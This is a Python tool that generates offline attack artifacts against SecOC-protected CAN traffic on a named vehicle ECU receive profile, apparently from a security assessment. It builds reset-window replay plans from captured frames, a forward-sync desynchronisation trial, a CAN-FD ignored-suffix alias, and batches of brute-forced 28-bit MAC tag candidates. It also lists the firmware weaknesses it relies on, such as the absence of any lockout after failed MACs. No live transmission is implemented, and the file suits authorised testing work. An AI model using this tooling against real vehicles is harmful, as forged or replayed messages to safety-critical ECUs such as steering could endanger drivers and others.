#!/usr/bin/env python3
"""Build offline SecOC reset-replay, future-sync, and tag-guess trial artifacts."""

from __future__ import annotations

import argparse
import hashlib
import json
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

SCHEMA = "sienna-secoc-freshness-trial-v1"
SYNC_CAN_ID = 0x00F
TAG_BITS = 28
TAG_MASK = (1 << TAG_BITS) - 1
MAX_TAG_GUESSES_PER_ARTIFACT = 65536


class FreshnessTrialError(RuntimeError):
    pass


@dataclass(frozen=True)
class SyncFrame:
    trip: int
    reset: int
    tag28: int
    raw: bytes


@dataclass(frozen=True)
class ProtectedFrame:
    payload: bytes
    transmitted_freshness: int
    tag28: int
    raw: bytes


def parse_frame_hex(value: str) -> bytes:
    compact = "".join(value.split()).replace("_", "")
    if compact.startswith("0x"):
        compact = compact[2:]
    try:
        data = bytes.fromhex(compact)
    except ValueError as exc:
        raise FreshnessTrialError("frame is not valid hexadecimal") from exc
    if len(data) != 8:
        raise FreshnessTrialError("classic SecOC frame must be exactly eight bytes")
    return data


def parse_sync_frame(data: bytes) -> SyncFrame:
    if len(data) != 8:
        raise FreshnessTrialError("sync frame must be exactly eight bytes")
    raw = int.from_bytes(data, "big")
    freshness36 = raw >> TAG_BITS
    return SyncFrame(
        trip=(freshness36 >> 20) & 0xFFFF,
        reset=freshness36 & 0xFFFFF,
        tag28=raw & TAG_MASK,
        raw=bytes(data),
    )


def parse_protected_frame(data: bytes) -> ProtectedFrame:
    if len(data) != 8:
        raise FreshnessTrialError("protected frame must be exactly eight bytes")
    trailer = int.from_bytes(data[4:8], "big")
    return ProtectedFrame(
        payload=bytes(data[:4]),
        transmitted_freshness=(trailer >> TAG_BITS) & 0xF,
        tag28=trailer & TAG_MASK,
        raw=bytes(data),
    )


def sync_candidate_is_forward(
    old_trip: int,
    old_reset: int,
    new_trip: int,
    new_reset: int,
    wrap_threshold: int = 0x0F,
) -> bool:
    for name, value, maximum in (
        ("old_trip", old_trip, 0xFFFF),
        ("new_trip", new_trip, 0xFFFF),
        ("old_reset", old_reset, 0xFFFFF),
        ("new_reset", new_reset, 0xFFFFF),
    ):
        if not 0 <= value <= maximum:
            raise FreshnessTrialError(f"{name} is outside its firmware field width")
    wrap = (
        old_trip >= 0xFFFF - wrap_threshold
        and new_trip != 0
        and new_trip <= wrap_threshold + 1
    )
    return (
        old_trip < new_trip
        or (old_trip == new_trip and old_reset < new_reset)
        or wrap
    )


def replace_tag(frame: bytes, tag28: int) -> bytes:
    if not 0 <= tag28 <= TAG_MASK:
        raise FreshnessTrialError("tag guess must fit in 28 bits")
    parsed = parse_protected_frame(frame)
    trailer = (parsed.transmitted_freshness << TAG_BITS) | tag28
    return parsed.payload + trailer.to_bytes(4, "big")


def base_result(operation: str, finding_ids: tuple[str, ...]) -> dict:
    return {
        "schema": SCHEMA,
        "created_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "mode": "offline_plan",
        "operation": operation,
        "finding_ids": list(finding_ids),
        "live_execution_implemented": False,
        "can_transmit_implemented": False,
        "target": "Sienna 8965B4512000 receive profile",
    }


def build_reset_replay(sync_data: bytes, protected: list[tuple[int, bytes]]) -> dict:
    sync = parse_sync_frame(sync_data)
    if sync.trip == 0 and sync.reset == 0:
        raise FreshnessTrialError("captured replay sync must be positive relative to post-init zero state")
    if not protected:
        raise FreshnessTrialError("reset replay needs at least one captured protected frame")
    rows = []
    for can_id, data in protected:
        if not 0 <= can_id <= 0x7FF or can_id == SYNC_CAN_ID:
            raise FreshnessTrialError("protected replay CAN ID must be a non-sync standard ID")
        parsed = parse_protected_frame(data)
        rows.append(
            {
                "can_id": f"0x{can_id:03X}",
                "frame": data.hex(),
                "payload": parsed.payload.hex(),
                "transmitted_freshness_nibble": parsed.transmitted_freshness,
                "tag28": f"0x{parsed.tag28:07X}",
            }
        )
    result = base_result("reset_window_replay", ("SECOC-012",))
    result.update(
        {
            "captured_sync": {
                "can_id": "0x00F",
                "frame": sync.raw.hex(),
                "trip": sync.trip,
                "reset": sync.reset,
                "tag28": f"0x{sync.tag28:07X}",
                "structurally_forward_from_post_init_zero": sync_candidate_is_forward(0, 0, sync.trip, sync.reset),
            },
            "protected_replays": rows,
            "trial_phases": [
                "cold reset target and independently confirm application restart",
                "prevent a legitimate synchronization frame from winning the startup race",
                "replay the captured authenticated 0x00F synchronization frame unchanged",
                "replay the captured protected frame(s) unchanged",
                "measure acceptance and the time until legitimate synchronization closes the window",
            ],
            "dynamic_unknowns": [
                "startup suppression/race feasibility",
                "sync cadence after reset",
                "which ordinary captured counters remain freshness-valid",
                "window duration before legitimate resynchronization",
            ],
        }
    )
    return result


def build_future_sync(current_data: bytes, candidate_data: bytes) -> dict:
    current = parse_sync_frame(current_data)
    candidate = parse_sync_frame(candidate_data)
    forward = sync_candidate_is_forward(current.trip, current.reset, candidate.trip, candidate.reset)
    if not forward:
        raise FreshnessTrialError("candidate sync is not structurally forward under the firmware predicate")
    result = base_result("future_sync_recovery", ("SECOC-012",))
    result.update(
        {
            "current_sync": {
                "frame": current.raw.hex(),
                "trip": current.trip,
                "reset": current.reset,
                "tag28": f"0x{current.tag28:07X}",
            },
            "candidate_sync": {
                "frame": candidate.raw.hex(),
                "trip": candidate.trip,
                "reset": candidate.reset,
                "tag28": f"0x{candidate.tag28:07X}",
                "structurally_forward": True,
            },
            "cryptographic_precondition": "candidate frame must already carry a valid MAC for its exact trip/reset value",
            "trial_phases": [
                "establish current synchronization epoch on isolated bench",
                "inject the pre-authenticated forward synchronization candidate",
                "allow the legitimate sender to resume lower synchronization epochs",
                "observe whether lower epochs remain rejected until receiver reset or external recovery",
            ],
            "dynamic_unknowns": [
                "whether a far-forward authenticated sync causes durable desynchronization",
                "whether any external freshness manager repairs the jump",
                "which diagnostic/status state exposes recovery",
            ],
        }
    )
    return result


def build_fd_suffix_alias(base_frame: bytes, suffix: bytes) -> dict:
    if len(base_frame) != 32:
        raise FreshnessTrialError("FD alias base must be exactly the EPS SecOC-effective 32 bytes")
    if len(suffix) not in (16, 32):
        raise FreshnessTrialError("FD suffix must be 16 or 32 bytes, producing DLC 48 or 64")
    physical = base_frame + suffix
    result = base_result("fd_ignored_suffix_alias", ("SECOC-014",))
    result.update(
        {
            "physical_dlc": len(physical),
            "eps_secoc_effective_length": 32,
            "base32": base_frame.hex(),
            "base32_sha256": hashlib.sha256(base_frame).hexdigest(),
            "ignored_suffix": suffix.hex(),
            "physical_frame": physical.hex(),
            "eps_authenticated_view_unchanged": True,
            "dynamic_unknowns": [
                "whether an upstream gateway preserves the suffix",
                "whether another receiving ECU interprets bytes beyond offset 31",
                "whether the physical network admits the longer FD DLC on the same route",
            ],
        }
    )
    return result


def build_tag_guesses(can_id: int, frame: bytes, start: int, count: int) -> tuple[dict, list[dict]]:
    if not 0 <= can_id <= 0x7FF or can_id == SYNC_CAN_ID:
        raise FreshnessTrialError("tag-guess CAN ID must be a non-sync standard ID")
    if not 0 <= start <= TAG_MASK:
        raise FreshnessTrialError("tag start must fit in 28 bits")
    if not 1 <= count <= MAX_TAG_GUESSES_PER_ARTIFACT:
        raise FreshnessTrialError(
            f"tag artifact count must be 1..{MAX_TAG_GUESSES_PER_ARTIFACT}"
        )
    if start + count - 1 > TAG_MASK:
        raise FreshnessTrialError("tag candidate range exceeds 28 bits")
    parsed = parse_protected_frame(frame)
    rows = []
    for guess in range(start, start + count):
        candidate = replace_tag(frame, guess)
        rows.append(
            {
                "index": guess - start,
                "tag28": f"0x{guess:07X}",
                "frame": candidate.hex(),
            }
        )
    result = base_result("tag_guess_candidates", ("SECOC-013",))
    result.update(
        {
            "can_id": f"0x{can_id:03X}",
            "base_frame": frame.hex(),
            "payload": parsed.payload.hex(),
            "transmitted_freshness_nibble": parsed.transmitted_freshness,
            "original_tag28": f"0x{parsed.tag28:07X}",
            "guess_start": f"0x{start:07X}",
            "guess_count": count,
            "mean_blind_work_factor": 1 << 27,
            "firmware_static_properties": {
                "tag_bits": TAG_BITS,
                "failed_mac_advances_freshness": False,
                "recovered_per_source_failure_lockout": False,
                "cryptoif_poll_budget_iterations": 0xE07,
            },
            "dynamic_preconditions": [
                "base transmitted freshness nibble must still reconstruct to an acceptable receiver freshness candidate",
                "legitimate traffic must not advance the target freshness state between guesses",
            ],
            "dynamic_unknowns": [
                "command-7 verification throughput",
                "queue replacement and watchdog load",
                "legitimate-frame loss / denial-of-service behavior",
            ],
        }
    )
    return result, rows


def write_json(path: Path | None, data: dict) -> None:
    if path is None:
        return
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="command", required=True)

    replay = sub.add_parser("reset-replay", help="plan a post-reset replay trial from captured valid frames")
    replay.add_argument("--sync-frame", required=True)
    replay.add_argument(
        "--protected",
        action="append",
        default=[],
        metavar="CAN_ID:FRAME_HEX",
        help="captured protected frame; repeat for multiple frames",
    )
    replay.add_argument("--result-output", type=Path)

    future = sub.add_parser("future-sync", help="validate and plan an authenticated forward-sync trial")
    future.add_argument("--current-frame", required=True)
    future.add_argument("--candidate-frame", required=True)
    future.add_argument("--result-output", type=Path)

    alias = sub.add_parser("fd-suffix-alias", help="construct a DLC-48/64 alias with identical first 32 bytes")
    alias.add_argument("--base32", required=True, help="32-byte secured FD frame as hex")
    alias.add_argument("--suffix", required=True, help="16- or 32-byte ignored suffix as hex")
    alias.add_argument("--result-output", type=Path)

    guesses = sub.add_parser("tag-guesses", help="generate a bounded offline set of 28-bit tag candidates")
    guesses.add_argument("--can-id", required=True, type=lambda value: int(value, 0))
    guesses.add_argument("--frame", required=True)
    guesses.add_argument("--start", type=lambda value: int(value, 0), default=0)
    guesses.add_argument("--count", type=int, default=256)
    guesses.add_argument("--candidates-output", type=Path)
    guesses.add_argument("--result-output", type=Path)
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    try:
        if args.command == "reset-replay":
            protected = []
            for item in args.protected:
                if ":" not in item:
                    raise FreshnessTrialError("--protected must be CAN_ID:FRAME_HEX")
                can_id_text, frame_text = item.split(":", 1)
                protected.append((int(can_id_text, 0), parse_frame_hex(frame_text)))
            result = build_reset_replay(parse_frame_hex(args.sync_frame), protected)
            write_json(args.result_output, result)
        elif args.command == "future-sync":
            result = build_future_sync(
                parse_frame_hex(args.current_frame),
                parse_frame_hex(args.candidate_frame),
            )
            write_json(args.result_output, result)
        elif args.command == "fd-suffix-alias":
            try:
                base32 = bytes.fromhex("".join(args.base32.split()))
                suffix = bytes.fromhex("".join(args.suffix.split()))
            except ValueError as exc:
                raise FreshnessTrialError("FD base/suffix is not valid hexadecimal") from exc
            result = build_fd_suffix_alias(base32, suffix)
            write_json(args.result_output, result)
        else:
            result, rows = build_tag_guesses(
                args.can_id,
                parse_frame_hex(args.frame),
                args.start,
                args.count,
            )
            if args.candidates_output is not None:
                args.candidates_output.parent.mkdir(parents=True, exist_ok=True)
                with args.candidates_output.open("w", encoding="utf-8") as stream:
                    for row in rows:
                        stream.write(json.dumps(row, sort_keys=True) + "\n")
                result["candidate_artifact"] = {
                    "path": str(args.candidates_output),
                    "sha256": hashlib.sha256(args.candidates_output.read_bytes()).hexdigest(),
                }
            write_json(args.result_output, result)
        print(json.dumps(result, indent=2, sort_keys=True))
        return 0
    except (OSError, ValueError, FreshnessTrialError) as exc:
        parser.error(str(exc))


if __name__ == "__main__":
    raise SystemExit(main())
